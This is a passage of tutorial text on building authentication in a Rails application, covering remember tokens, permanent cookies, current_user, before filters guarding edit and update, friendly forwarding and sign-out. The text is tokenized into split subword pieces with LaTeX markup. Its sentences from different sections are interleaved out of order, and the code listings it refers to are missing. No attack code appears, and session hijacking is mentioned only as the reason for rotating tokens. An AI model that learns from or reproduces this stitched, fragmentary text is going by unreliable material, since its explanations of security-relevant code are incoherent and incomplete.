▁Because ▁HTTP ▁is ▁a ▁\ href { http :// en . wiki p edia . org / wiki / H ypertext _ Transfer _ Protocol # HTTP _ session _ state }{\ emph { state less ▁protocol } }, ▁web ▁applications ▁requiring ▁user ▁signin ▁must ▁implement ▁a ▁way ▁to ▁track ▁each ▁user ' s ▁ prog re s s ▁from ▁page ▁to ▁page .
▁One ▁technique ▁for ▁maintain ing ▁the ▁user ▁signin ▁status ▁is ▁to ▁use ▁a ▁tr ad it ion al ▁Rails ▁session ▁( via ▁the ▁special ▁\ k ode { session } ▁function ) ▁to ▁store ▁a ▁\ emph { remember ▁token } ▁equal ▁to ▁the ▁user ' s ▁id :
▁This ▁\ k ode { session } ▁object ▁make s ▁the ▁user ▁id ▁available ▁from ▁page ▁to ▁page ▁by ▁storing ▁it ▁in ▁a ▁cookie ▁that ▁expire s ▁upon ▁browser ▁close .
▁On ▁each ▁page , ▁the ▁application ▁could ▁simply ▁call
▁to ▁retrieve ▁the ▁user .
▁Because ▁of ▁the ▁way ▁Rails ▁handle s ▁sessions , ▁this ▁process ▁is ▁secure ; ▁if ▁a ▁ malicious ▁user ▁ tries ▁to ▁sp o of ▁the ▁user ▁id , ▁Rails ▁will ▁detect ▁a ▁m is match ▁base d ▁on ▁a ▁special ▁\ emph { session ▁id } ▁generated ▁for ▁each ▁session .
▁For ▁our ▁application ' s ▁design ▁choice , ▁which ▁involve s ▁\ emph { persistent } ▁sessions --- that ▁is , ▁signin ▁status ▁that ▁last s ▁even ▁after ▁browser ▁close --- we ▁need ▁to ▁use ▁a ▁\ emph { permanent } ▁identifier ▁for ▁the ▁signed - in ▁user .
▁To ▁accomplish ▁this , ▁we ' ll ▁generate ▁a ▁unique , ▁secure ▁remember ▁token ▁for ▁each ▁user ▁and ▁store ▁it ▁as ▁a ▁\ emph { permanent } ▁cookie ▁rather ▁than ▁one ▁that ▁expire s ▁on ▁browser ▁close .
▁The ▁User ▁model ▁with ▁an ▁added ▁\ k ode { remember \_ token } ▁attribute .
▁A ▁first ▁test ▁for ▁the ▁remember ▁token .
▁We ▁can ▁get ▁this ▁test ▁to ▁pass ▁by ▁ generating ▁a ▁remember ▁token ▁at ▁the ▁command ▁line :
▁A ▁migration ▁to ▁add ▁a ▁\ k ode { remember \_ token } ▁to ▁the ▁\ k ode { users } ▁table .
▁Next ▁we ▁update ▁the ▁development ▁and ▁test ▁database s ▁as ▁usual :
▁At ▁this ▁point ▁the ▁User ▁model ▁spec s ▁should ▁be ▁passing :
▁There ▁are ▁many ▁most ly ▁equivalent ▁possibilities --- es s ent i ally , ▁any ▁large ▁random ▁string ▁will ▁do ▁just ▁fine , ▁as ▁long ▁as ▁it ' s ▁unique .
▁To ▁make ▁our ▁remember ▁token ▁even ▁more ▁secure , ▁we ' ll ▁plan ▁to ▁change ▁it ▁every ▁time ▁a ▁user ▁creates ▁a ▁new ▁session , ▁which ▁means ▁that ▁any ▁\ href { http :// en . wiki p edia . org / wiki / Session _ hijack ing }{ hijack ed ▁sessions }--- in ▁which ▁an ▁attacker ▁uses ▁a ▁stolen ▁cookie ▁to ▁sign ▁in ▁as ▁a ▁particular ▁user --- will ▁expire ▁the ▁next ▁time ▁a ▁user ▁sign s ▁in .
▁( Session ▁ hijack ing ▁was ▁ wide ly ▁public ize d ▁by ▁the ▁\ href { http :// code but ler . com / fi re s h eep }{ F ir es h eep } ▁application , ▁which ▁show ed ▁that ▁remember ▁token s ▁at ▁many ▁high - profile ▁site s ▁were ▁visible ▁when ▁connect ed ▁to ▁public ▁Wi - F i ▁network s .
▁A lthough ▁in ▁the ▁actual ▁application ▁we ▁will ▁immediately ▁sign ▁in ▁a ▁new ly ▁created ▁user ▁( th us ▁creating ▁a ▁new ▁remember ▁token ▁as ▁a ▁side - e ffect ), ▁we ▁don ' t ▁want ▁to ▁rely ▁on ▁this ▁behavior ; ▁a ▁more ▁ r ob us t ▁practice ▁is ▁to ▁ensure ▁that ▁\ emph { ever y } ▁user ▁has ▁a ▁valid ▁remember ▁token ▁right ▁from ▁the ▁start .
▁S ince ▁we ▁can ' t ▁allow ▁just ▁any ▁user ▁to ▁have ▁such ▁ danger ous ▁power s , ▁we ' ll ▁take ▁care ▁to ▁create ▁a ▁privilege d ▁class ▁of ▁ administrative ▁users ▁( admin s ) ▁authoriz ed ▁to ▁delete ▁other ▁users .
▁In ▁that ▁section , ▁we ▁used ▁a ▁\ k ode { before \_ save } ▁callback ; ▁this ▁time , ▁we ' ll ▁use ▁the ▁close ly ▁related ▁\ k ode { before \_ create } ▁callback ▁to ▁set ▁the ▁remember ▁token ▁when ▁the ▁user ▁is ▁first ▁created
▁For ▁more ▁details ▁on ▁the ▁kind ▁of ▁callbacks ▁supported ▁by ▁Active ▁Record , ▁see ▁the ▁\ href { http :// guides . rubyonrails . org / v 3 . 2 . 1 3 / active _ record _ validations _ callback s . html }{ d is c us s ion ▁of ▁callbacks ▁at ▁the ▁Rails ▁G u id es }.
▁To ▁test ▁the ▁remember ▁token , ▁we ▁first ▁save ▁the ▁test ▁user ▁( the re by ▁creating ▁it , ▁since ▁it ▁has ▁ never ▁been ▁saved ), ▁and ▁the n ▁check ▁that ▁the ▁user ' s ▁\ k ode { remember \_ token } ▁attribute ▁is n ' t ▁blank .
▁This ▁gives ▁us ▁ s u ff ic i ent ▁flexibility ▁to ▁change ▁the ▁random ▁string ▁if ▁we ▁ever ▁need ▁to .
▁The ▁big g est ▁difference ▁is ▁that , ▁while ▁any one ▁can ▁sign ▁up , ▁only ▁the ▁current ▁user ▁should ▁be ▁able ▁to ▁update ▁his ▁information .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : remember _ token _ s h o ul d _ not _ be _ blank }
▁A ▁test ▁for ▁a ▁valid ▁( n on blank ) ▁remember ▁token .
▁First , ▁note ▁the ▁link ▁to ▁change ▁the ▁Gravatar ▁image ; ▁if ▁you ▁p o k e ▁around ▁the ▁Gravatar ▁site , ▁you ' ll ▁see ▁that ▁the ▁page ▁to ▁add ▁or ▁edit ▁images ▁is ▁located ▁at ▁\ href { http :// gravatar . com / email s }{ http :// gravatar . com / email s }, ▁so ▁we ▁test ▁the ▁\ k ode { edit } ▁page ▁for ▁a ▁link ▁with ▁that ▁URL
▁The ▁Gravatar ▁site ▁actually ▁redirect s ▁this ▁to ▁\ href { http :// en . gravatar . com / email s }{ http :// en . gravatar . com / email s }, ▁which ▁is ▁for ▁English ▁language ▁users , ▁but ▁I ' ve ▁omitted ▁the ▁\ text tt { en } ▁part ▁to ▁account ▁for ▁the ▁use ▁of ▁other ▁languages .
▁A ▁mockup ▁of ▁the ▁user ▁edit ▁page . ~\ href { http :// railstutorial . org / images / figures / edit _ user _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : user _ edit _ spec s }
▁Tests ▁for ▁the ▁user ▁edit ▁page .
▁This ▁code , ▁called ▁a ▁\ emph { method ▁reference }, ▁arrange s ▁for ▁Rails ▁to ▁look ▁for ▁a ▁method ▁called ▁\ k ode { create \_ remember \_ token } ▁and ▁run ▁it ▁before ▁saving ▁the ▁user .
▁S ec on d , ▁the ▁method ▁itself ▁is ▁only ▁used ▁internally ▁by ▁the ▁User ▁model , ▁so ▁there ' s ▁no ▁need ▁to ▁expose ▁it ▁to ▁outside ▁users .
▁To ▁write ▁the ▁application ▁code , ▁we ▁need ▁to ▁fill ▁in ▁the ▁\ k ode { edit } ▁action ▁in ▁the ▁Users ▁controller .
▁Recall ▁that ▁the ▁id ▁of ▁the ▁user ▁is ▁available ▁in ▁the ▁\ k ode { params [: id ]} ▁variable , ▁which ▁means ▁that ▁we ▁can ▁find ▁the ▁user ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : initial _ edit _ action }.
▁will ▁raise ▁a ▁\ k ode { NoMethodError } ▁exception .
▁F inally , ▁the ▁\ k ode { create \_ remember \_ token } ▁method ▁needs ▁to ▁\ emph { as sign } ▁to ▁one ▁of ▁the ▁user ▁attributes , ▁and ▁in ▁this ▁context ▁it ▁is ▁necessary ▁to ▁use ▁the ▁\ k ode { self } ▁keyword ▁in ▁front ▁of ▁\ k ode { remember \_ token } :
▁Because ▁of ▁the ▁way ▁Ruby ▁handle s ▁assignment s ▁inside ▁objects , ▁without ▁\ k ode { self } ▁the ▁assignment ▁would ▁create ▁a ▁\ emph { local } ▁variable ▁called ▁\ k ode { remember \_ token }, ▁which ▁is n ' t ▁what ▁we ▁want ▁at ▁all .
▁Using ▁\ k ode { self } ▁ensure s ▁that ▁assignment ▁set s ▁the ▁user ' s ▁\ k ode { remember \_ token }, ▁and ▁as ▁a ▁result ▁it ▁will ▁be ▁written ▁to ▁the ▁database ▁along ▁with ▁the ▁other ▁attributes ▁when ▁the ▁user ▁is ▁saved .
▁( The ▁call ▁to ▁\ emph { to \_ s } ▁is ▁to ▁make ▁sure ▁we ▁can ▁handle ▁\ k ode { nil } ▁token s , ▁which ▁should n ' t ▁happen ▁in ▁browsers ▁but ▁some times ▁happens ▁in ▁tests .)
▁in ▁Listing ~\ ref { code : before _ create _ remember _ token }.
▁A ▁\ k ode { before \_ create } ▁callback ▁to ▁create ▁\ k ode { remember \_ token }.
▁By ▁the ▁way , ▁the ▁extra ▁level ▁of ▁indentation ▁on ▁\ k ode { create \_ remember \_ token } ▁is ▁there ▁to ▁make ▁it ▁ visual ly ▁apparent ▁which ▁methods ▁are ▁defined ▁after ▁\ k ode { private }.
▁( Experience ▁shows ▁that ▁this ▁is ▁a ▁ wise ▁practice .)
▁As ▁a ▁final ▁ touch , ▁we ' ll ▁add ▁a ▁URL ▁to ▁the ▁user ▁settings ▁link ▁to ▁the ▁site ▁navigation .
▁Now ▁we ' re ▁ready ▁to ▁write ▁the ▁first ▁signin ▁element , ▁the ▁\ k ode { sign \_ in } ▁function ▁itself .
▁as ▁show n ▁in ▁Listing ~\ ref { code : settings _ link _ test }.
▁ Adding ▁a ▁test ▁for ▁the ▁`` S et ting s '' ▁link .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : sign _ in _ function }
▁The ▁complete ▁( but ▁not - y et - working ) ▁\ k ode { sign \_ in } ▁function .
▁as ▁show n ▁in ▁Listing ~\ ref { code : sign _ in _ helper }.
▁A ▁test ▁helper ▁to ▁sign ▁users ▁in .
▁# ▁ Sign ▁in ▁when ▁not ▁using ▁Capybara .
▁ Each ▁element ▁in ▁the ▁cookie ▁is ▁itself ▁a ▁hash ▁of ▁two ▁elements , ▁a ▁\ k ode { value } ▁and ▁an ▁optional ▁\ k ode { expire s } ▁date .
▁For ▁example , ▁we ▁could ▁implement ▁user ▁signin ▁by ▁ placing ▁a ▁cookie ▁with ▁value ▁equal ▁to ▁the ▁remember ▁token ▁that ▁expire s ▁20 ~ years ▁from ▁now :
▁As ▁noted ▁in ▁the ▁comment ▁line , ▁ filling ▁in ▁the ▁form ▁does n ' t ▁work ▁when ▁not ▁using ▁Capybara , ▁so ▁to ▁cover ▁this ▁case ▁we ▁allow ▁the ▁user ▁to ▁pass ▁the ▁option ▁\ k ode { no \_ ca p y a bar a : ▁true } ▁to ▁override ▁the ▁default ▁signin ▁method ▁and ▁manipulate ▁the ▁cookies ▁directly .
▁< n > ▁=> ▁Sun , ▁1 3 ▁M ar ▁ 2011 ▁0 3 : 38 : 5 5 ▁UTC ▁ + 00:00
▁in ▁Listing ~\ ref { code : delete _ destroy _ test }.
▁< n > ▁=> ▁S at , ▁ 02 ▁Jan ▁2010 ▁0 3 : 39 : 1 4 ▁UTC ▁ + 00:00
▁ Adding ▁a ▁`` S et ting s '' ▁link .
▁This ▁pattern ▁of ▁setting ▁a ▁cookie ▁that ▁expire s ▁20 ▁ years ▁in ▁the ▁future ▁be ca me ▁so ▁common ▁that ▁Rails ▁added ▁a ▁special ▁\ k ode { permanent } ▁method ▁to ▁implement ▁it , ▁so ▁that ▁we ▁can ▁simply ▁write
▁Having ▁discuss ed ▁how ▁to ▁store ▁the ▁user ' s ▁remember ▁token ▁in ▁a ▁cookie ▁for ▁later ▁use , ▁we ▁now ▁need ▁to ▁learn ▁how ▁to ▁retrieve ▁the ▁user ▁on ▁subsequent ▁page ▁views .
▁Let ' s ▁look ▁again ▁at ▁the ▁\ k ode { sign \_ in } ▁function ▁to ▁see ▁where ▁we ▁are :
▁The ▁only ▁code ▁not ▁present ly ▁working ▁is
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ update _ action _ unsuccessful }.
▁To ▁start ▁writing ▁the ▁code ▁for ▁\ k ode { current \_ user }, ▁note ▁that ▁the ▁line
▁With ▁invalid ▁information , ▁the ▁update ▁attempt ▁returns ▁\ k ode { false }, ▁so ▁the ▁\ k ode { else } ▁branch ▁re - render s ▁the ▁edit ▁page .
▁is ▁an ▁\ emph { assignment }, ▁which ▁we ▁must ▁define .
▁in ▁Listing ~\ ref { code : current _ user _ equal s }.
▁Defin ing ▁assignment ▁to ▁\ k ode { current \_ user }.
▁This ▁m ight ▁look ▁confusing --- most ▁languages ▁don ' t ▁let ▁you ▁use ▁the ▁equal s ▁sign ▁in ▁a ▁method ▁definition --- but ▁it ▁simply ▁defines ▁a ▁method ▁\ k ode { current \_ user = } ▁express ly ▁design ed ▁to ▁handle ▁assignment ▁to ▁\ k ode { current \_ user }.
▁there by ▁in v o k ing ▁the ▁\ k ode { current \_ user = } ▁method .
▁ Error ▁message ▁from ▁ submitting ▁the ▁update ▁form . ~\ href { http :// railstutorial . org / images / figures / edit _ with _ invalid _ information _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁\ href { http :// gravatar . com /}{ Gravatar } ▁image - c r o p p ing ▁interface , ▁with ▁a ▁ picture ▁of ▁\ href { http :// michael hartl . com /}{ some ▁ dude }.
▁It s ▁one ▁argument ▁is ▁the ▁right - h and ▁side ▁of ▁the ▁assignment , ▁in ▁this ▁case ▁the ▁user ▁to ▁be ▁signed ▁in .
▁The ▁tests ▁for ▁the ▁\ k ode { update } ▁action ▁are ▁similar ▁to ▁those ▁for ▁\ k ode { create }.
▁The ▁one - line ▁method ▁body ▁just ▁set s ▁an ▁instance ▁variable ▁\ k ode {@ current \_ user }, ▁effective ly ▁storing ▁the ▁user ▁for ▁later ▁use .
▁as ▁show n ▁in ▁Listing ~\ ref { code : current _ user _ wrong }.
▁Tests ▁for ▁the ▁user ▁\ k ode { update } ▁action .
▁A ▁te mp ting ▁but ▁use less ▁definition ▁for ▁\ k ode { current \_ user }.
▁Do n ' t ▁use ▁this ▁line .
▁In ▁fact , ▁the ▁two ▁are ▁exactly ▁equivalent ; ▁\ k ode { attr \_ accessor } ▁is ▁me re ly ▁a ▁convenient ▁way ▁to ▁create ▁just ▁such ▁get ter / set ter ▁methods ▁automatically .
▁from ▁Listing ~\ ref { code : sign _ in _ helper } ▁to
▁This ▁reload s ▁the ▁\ k ode { user } ▁variable ▁from ▁the ▁test ▁database ▁using ▁\ k ode { user . reload }, ▁and ▁the n ▁verifie s ▁that ▁the ▁user ' s ▁new ▁name ▁and ▁email ▁match ▁the ▁new ▁values .
▁The ▁\ k ode { update } ▁action ▁needed ▁to ▁get ▁the ▁tests ▁in ▁Listing ~\ ref { code : user _ update _ spec s } ▁to ▁pass ▁is ▁similar ▁to ▁the ▁final ▁form ▁of ▁the ▁\ k ode { create } ▁action ▁( Listing ~\ ref { code : signin _ upon _ signup }), ▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ update _ action }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : current _ user _ working }.
▁All ▁this ▁does ▁is ▁add
▁in ▁Listing ~\ ref { code : user _ update _ action _ unsuccessful }.
▁Find ing ▁the ▁current ▁user ▁using ▁the ▁\ k ode { remember \_ token }.
▁It s ▁effect ▁is ▁to ▁set ▁the ▁\ k ode {@ current \_ user } ▁instance ▁variable ▁to ▁the ▁user ▁corresponding ▁to ▁the ▁remember ▁token , ▁but ▁only ▁if ▁\ k ode {@ current \_ user } ▁is ▁undefined
▁With ▁the ▁code ▁in ▁this ▁section , ▁the ▁user ▁edit ▁page ▁should ▁be ▁working , ▁as ▁you ▁can ▁double - check ▁by ▁re - running ▁the ▁test ▁suite , ▁which ▁should ▁now ▁be ▁green :
▁T ypically , ▁this ▁means ▁assign ing ▁to ▁variables ▁that ▁are ▁initially ▁\ k ode { nil }, ▁but ▁note ▁that ▁\ k ode { false } ▁values ▁will ▁also ▁be ▁over written ▁by ▁the ▁\ k ode { ||= } ▁operator .
▁In ▁other ▁words , ▁the ▁construction
▁calls ▁the ▁\ k ode { find \_ by } ▁method ▁the ▁first ▁time ▁\ k ode { current \_ user } ▁is ▁called , ▁but ▁on ▁subsequent ▁ invocation s ▁returns ▁\ k ode {@ current \_ user } ▁without ▁hit ting ▁the ▁database
▁This ▁is ▁only ▁useful ▁if ▁\ k ode { current \_ user } ▁is ▁used ▁more ▁than ▁once ▁for ▁a ▁single ▁user ▁request ; ▁in ▁any ▁case , ▁\ k ode { find \_ by } ▁will ▁be ▁called ▁at ▁least ▁once ▁every ▁time ▁a ▁user ▁visit s ▁a ▁page ▁on ▁the ▁site .
▁In ▁this ▁section , ▁we ' ll ▁implement ▁a ▁security ▁model ▁that ▁requires ▁users ▁to ▁be ▁signed ▁in ▁and ▁prevent s ▁them ▁from ▁updating ▁any ▁information ▁other ▁than ▁their ▁own .
▁The ▁\ text tt { ||= } ▁construction ▁is ▁very ▁Ruby is h --- that ▁is , ▁it ▁is ▁high ly ▁character ist ic ▁of ▁the ▁Ruby ▁language --- and ▁hence ▁important ▁to ▁learn ▁if ▁you ▁plan ▁on ▁doing ▁much ▁Ruby ▁programming .
▁A ▁mockup ▁of ▁the ▁result ▁of ▁visit ing ▁a ▁ protected ▁page ~\ href { http :// railstutorial . org / images / figures / signin _ page _ protected _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁T h ough ▁at ▁first ▁it ▁may ▁seem ▁mysterious , ▁\ emph { or ▁equal s } ▁is ▁easy ▁to ▁understand ▁by ▁analogy .
▁S ince ▁the ▁security ▁restrict ion s ▁for ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions ▁are ▁identical , ▁we ' ll ▁handle ▁them ▁in ▁a ▁single ▁RSpec ▁\ k ode { de sc r i be } ▁block .
▁We ▁start ▁by ▁noting ▁a ▁common ▁idiom ▁for ▁changing ▁a ▁current ly ▁defined ▁variable .
▁as ▁seen ▁in ▁Listing ~\ ref { code : protected _ edit _ update _ tests }.
▁Testing ▁that ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions ▁are ▁ protected .
▁M any ▁computer ▁program s ▁involve ▁increment ing ▁a ▁variable , ▁as ▁in
▁ Most ▁languages ▁provide ▁a ▁ s y n t ac tic ▁shortcut ▁for ▁this ▁operation ; ▁in ▁Ruby ▁( and ▁in ▁C , ▁C ++ , ▁P er l , ▁P y th on , ▁Java , ▁etc .) , ▁it ▁appears ▁as ▁follows :
▁< n > ▁ >> ▁x ▁= ▁1
▁< n > ▁=> ▁1
▁< n > ▁ >> ▁x ▁ + = ▁1
▁< n > ▁=> ▁2
▁< n > ▁ >> ▁x ▁* = ▁3
▁< n > ▁=> ▁6
▁This ▁is ▁necessary ▁because ▁there ▁is ▁no ▁way ▁for ▁a ▁browser ▁to ▁visit ▁the ▁\ k ode { update } ▁action ▁directly --- it ▁can ▁only ▁get ▁there ▁in directly ▁by ▁ submitting ▁the ▁edit ▁form --- so ▁Capybara ▁can ' t ▁do ▁it ▁either .
▁< n > ▁ >> ▁x ▁- = ▁7
▁< n > ▁=> ▁- 1
▁But ▁visit ing ▁the ▁edit ▁page ▁only ▁tests ▁the ▁authorization ▁for ▁the ▁\ k ode { edit } ▁action , ▁not ▁for ▁\ k ode { update }.
▁As ▁a ▁result , ▁the ▁only ▁way ▁to ▁test ▁the ▁proper ▁authorization ▁for ▁the ▁\ k ode { update } ▁action ▁itself ▁is ▁to ▁issue ▁a ▁direct ▁request . ▁(
▁As ▁you ▁m ight ▁guess , ▁in ▁addition ▁to ▁\ k ode { patch } ▁Rails ▁tests ▁support ▁\ k ode { get }, ▁\ k ode { post }, ▁and ▁\ k ode { delete } ▁as ▁well .)
▁When ▁using ▁one ▁of ▁the ▁methods ▁to ▁issue ▁HTTP ▁requests ▁directly , ▁we ▁get ▁access ▁to ▁the ▁ low - level ▁\ k ode { response } ▁object .
▁< n > ▁ >> ▁@ user
▁Un like ▁the ▁Capybara ▁\ k ode { page } ▁object , ▁\ k ode { response } ▁let s ▁us ▁test ▁for ▁the ▁server ▁response ▁itself , ▁in ▁this ▁case ▁verify ing ▁that ▁the ▁\ k ode { update } ▁action ▁respond s ▁by ▁redirect ing ▁to ▁the ▁signin ▁page :
▁< n > ▁=> ▁nil
▁< n > ▁ >> ▁@ user ▁= ▁@ user ▁|| ▁" the ▁user "
▁as ▁show n ▁in ▁Listing ~\ ref { code : authorize _ before _ filter }.
▁< n > ▁=> ▁" the ▁user "
▁< n > ▁ >> ▁@ user ▁= ▁@ user ▁|| ▁" another ▁user "
▁ Adding ▁a ▁\ k ode { signed \_ in \_ user } ▁before ▁filter .
▁S ince ▁\ text tt { nil } ▁is ▁false ▁in ▁a ▁boolean ▁context , ▁the ▁first ▁assignment ▁is ▁\ text tt { nil ▁|| ▁" the ▁user " }, ▁which ▁evaluate s ▁to ▁\ text tt {" the ▁user "} ; ▁similar ly , ▁the ▁second ▁assignment ▁is ▁\ text tt {" the ▁user " ▁|| ▁" another ▁user " }, ▁which ▁also ▁evaluate s ▁to ▁\ text tt {" the ▁user " }--- since ▁strings ▁are ▁\ text tt { true } ▁in ▁a ▁boolean ▁context , ▁the ▁series ▁of ▁\ text tt {|| } ▁expression s ▁ ter m in ate s ▁after ▁the ▁first ▁expression ▁is ▁evaluated .
▁ Compar ing ▁the ▁console ▁sessions ▁for ▁the ▁ various ▁operator s , ▁we ▁see ▁that ▁\ text tt {@ user ▁= ▁@ user ▁|| ▁value } ▁follows ▁the ▁\ text tt { x ▁= ▁x ▁O ▁ y } ▁pattern ▁with ▁\ text tt {|| } ▁in ▁the ▁place ▁of ▁\ text tt { O }, ▁which ▁suggest s ▁the ▁following ▁equivalent ▁construction :
▁< n > ▁ >> ▁@ user ▁ ||= ▁" the ▁user "
▁We ▁come ▁finally ▁to ▁a ▁practical ▁application ▁of ▁all ▁our ▁signin / out ▁work : ▁we ' ll ▁change ▁the ▁layout ▁links ▁base d ▁on ▁signin ▁status .
▁The ▁way ▁to ▁change ▁the ▁links ▁in ▁the ▁site ▁layout ▁involve s ▁using ▁an < n > if - else ▁branch ing ▁structure ▁inside ▁of ▁ Embedded ▁Ruby :
▁< n > ▁# ▁Link s ▁for ▁signed - in ▁users
▁< n > ▁# ▁Link s ▁for ▁non - signed - in - users
▁This ▁kind ▁of ▁code ▁requires ▁the ▁exist ence ▁of ▁a ▁\ k ode { signed \_ in ?}\ ▁boolean , ▁which ▁we ' ll ▁now ▁define .
▁A ▁user ▁is ▁signed ▁in ▁if ▁there ▁is ▁a ▁current ▁user ▁in ▁the ▁session , ▁i . e . , ▁if ▁\ k ode { current \_ user } ▁is ▁non - \ k ode { nil }.
▁The ▁signin ▁form ▁after ▁try ing ▁to ▁access ▁a ▁ protected ▁page . ~\ href { http :// railstutorial . org / images / figures / protected _ sign _ in _ bootstrap - full . png }{ ( full ▁size )}
▁This ▁requires ▁the ▁use ▁of ▁the ▁`` not '' ▁operator , ▁written ▁using ▁an ▁excl am ation ▁point ~\ k ode { ! } ▁and ▁usually ▁read ▁as ▁`` bang ''.
▁as ▁show n ▁in ▁Listing ~\ ref { code : signed _ in _ p }.
▁Of ▁course , ▁requiring ▁users ▁to ▁sign ▁in ▁is n ' t ▁quite ▁enough ; ▁users ▁should ▁only ▁be ▁allowed ▁to ▁edit ▁their ▁\ emph { own } ▁information .
▁Testing ▁that ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions ▁require ▁the ▁right ▁user .
▁With ▁the ▁\ k ode { signed \_ in ?}\ ▁method ▁in ▁hand , ▁we ' re ▁ready ▁to ▁finish ▁the ▁layout ▁links .
▁but ▁Rails ▁allows ▁us ▁to ▁link ▁directly ▁to ▁the ▁user , ▁in ▁this ▁context ▁automatically ▁convert ing ▁\ k ode { current \_ user } ▁into ▁\ k ode { user \_ path ( current \_ user ) }.
▁In ▁the ▁process ▁of ▁ putting ▁the ▁new ▁links ▁into ▁the ▁layout , ▁we ' ll ▁take ▁advantage ▁of ▁Bootstrap ' s ▁ability ▁to ▁make ▁ drop d own ▁menu s , ▁which ▁you ▁can ▁read ▁more ▁about ▁on ▁the ▁\ href { http :// get bootstrap . com / 2 . 3 . 2 / com p on ent s . html }{ Bootstrap ▁components ▁page }.
▁Note ▁here ▁that ▁a ▁ factory ▁can ▁take ▁an ▁option :
▁in ▁Listing ~\ ref { code : layout _ signin _ signout _ links }.
▁This ▁creates ▁a ▁user ▁with ▁a ▁different ▁email ▁address ▁from ▁the ▁default .
▁Note ▁in ▁particular ▁the ▁CSS ~ id s ▁and ▁classes ▁related ▁to ▁the ▁Bootstrap ▁ drop d own ▁menu .
▁The ▁tests ▁specify ▁that ▁the ▁original ▁user ▁should ▁not ▁have ▁access ▁to ▁the ▁wrong ▁user ' s ▁\ k ode { edit } ▁or ▁\ k ode { update } ▁actions .
▁ Chang ing ▁the ▁layout ▁links ▁for ▁signed - in ▁users .
▁and ▁similar ly ▁for ▁\ k ode { update }.
▁Now ▁that ▁the ▁\ k ode { correct \_ user } ▁before ▁filter ▁defines ▁\ k ode {@ user }, ▁we ▁can ▁omit ▁it ▁from ▁both ▁actions .
▁Before ▁mov ing ▁on , ▁you ▁should ▁verify ▁that ▁the ▁test ▁suite ▁passes :
▁A ▁signed - in ▁user ▁with ▁new ▁links ▁and ▁a ▁ drop d own ▁menu . ~\ href { http :// railstutorial . org / images / figures / profile _ with _ signout _ link _ bootstrap - full . png }{ ( full ▁size )}
▁At ▁this ▁point , ▁you ▁should ▁verify ▁that ▁you ▁can ▁sign ▁in , ▁close ▁the ▁browser , ▁and ▁the n ▁ still ▁be ▁signed ▁in ▁when ▁you ▁visit ▁the ▁sample ▁application .
▁In ▁other ▁words , ▁if ▁a ▁non - logged - in ▁user ▁ tries ▁to ▁visit ▁the ▁edit ▁page , ▁after ▁sign ing ▁in ▁the ▁user ▁will ▁be ▁redirect ed ▁to ▁/ users /1 ▁instead ▁of ▁/ users /1/ edit .
▁The ▁remember ▁token ▁cookie ▁in ▁the ▁local ▁browser . ~\ href { http :// railstutorial . org / images / figures / cookie _ in _ browser - full . png }{ ( full ▁size )}
▁To ▁test ▁for ▁such ▁`` friendly ▁forwarding '' , ▁we ▁first ▁visit ▁the ▁user ▁edit ▁page , ▁which ▁redirect s ▁to ▁the ▁signin ▁page .
▁In ▁principle , ▁although ▁we ▁are ▁now ▁done ▁with ▁authentication , ▁new ly ▁registered ▁users ▁m ight ▁be ▁confuse d , ▁as ▁they ▁are ▁not ▁signed ▁in ▁by ▁default .
▁Implement ing ▁this ▁is ▁the ▁last ▁bit ▁of ▁polish ▁before ▁let ting ▁users ▁sign ▁out .
▁We ▁the n ▁enter ▁valid ▁signin ▁information ▁and ▁click ▁the ▁`` Sign ▁in '' ▁button .
▁The ▁result ing ▁page , ▁which ▁by ▁default ▁is ▁the ▁user ' s ▁profile , ▁should ▁in ▁this ▁case ▁be ▁the ▁`` Edit ▁user '' ▁page .
▁in ▁Listing ~\ ref { code : friendly _ forwarding _ test }.
▁Testing ▁that ▁new ly ▁signed - up ▁users ▁are ▁also ▁signed ▁in .
▁Here ▁we ' ve ▁test ed ▁the ▁appearance ▁of ▁the ▁ signout ▁link ▁to ▁verify ▁that ▁the ▁user ▁was ▁successfully ▁signed ▁in ▁after ▁sign ing ▁up .
▁Now ▁for ▁the ▁implementation
▁ Sign ing ▁in ▁the ▁user ▁upon ▁signup .
▁In ▁order ▁to ▁forward ▁users ▁to ▁their ▁intend ed ▁d est in ation , ▁we ▁need ▁to ▁store ▁the ▁location ▁of ▁the ▁request ed ▁page ▁some where , ▁and ▁the n ▁redirect ▁to ▁that ▁location ▁instead .
▁In ▁this ▁section , ▁we ' ll ▁add ▁this ▁necessary ▁ signout ▁c ap ability .
▁So ▁far , ▁the ▁Sessions ▁controller ▁actions ▁have ▁followed ▁the ▁RESTful ▁convention ▁of ▁using ▁\ k ode { new } ▁for ▁a ▁signin ▁page ▁and ▁\ k ode { create } ▁to ▁complete ▁the ▁signin .
▁We ' ll ▁continu e ▁this ▁the me ▁by ▁using ▁a ▁\ k ode { destroy } ▁action ▁to ▁delete ▁sessions , ▁i . e . , ▁to ▁sign ▁out .
▁A ▁test ▁for ▁sign ing ▁out ▁a ▁user .
▁ Adding ▁\ k ode { store \_ location } ▁to ▁the ▁signed - in ▁user ▁before ▁filter .
▁ Destroy ing ▁a ▁session ▁( user ▁ signout ).
▁sign _ out
▁As ▁with ▁the ▁other ▁authentication ▁elements , ▁we ' ll ▁put ▁\ k ode { sign \_ out } ▁in ▁the ▁Sessions ▁helper ▁module .
▁The ▁\ k ode { sign \_ out } ▁method ▁in ▁the ▁Sessions ▁helper ▁module .
▁in ▁Listing ~\ ref { code : friendly _ session _ create }.
▁This ▁complete s ▁the ▁signup / signin / signout ▁tr i um v ir ate , ▁and ▁the ▁test ▁suite ▁should ▁pass :
▁As ▁usual , ▁it ' s ▁a ▁good ▁idea ▁to ▁verify ▁that ▁the ▁test ▁suite ▁is ▁green ▁before ▁proceeding :
▁It ' s ▁worth ▁noting ▁that ▁our ▁test ▁suite ▁cover s ▁most ▁of ▁the ▁authentication ▁machinery , ▁but ▁not ▁all ▁of ▁it .
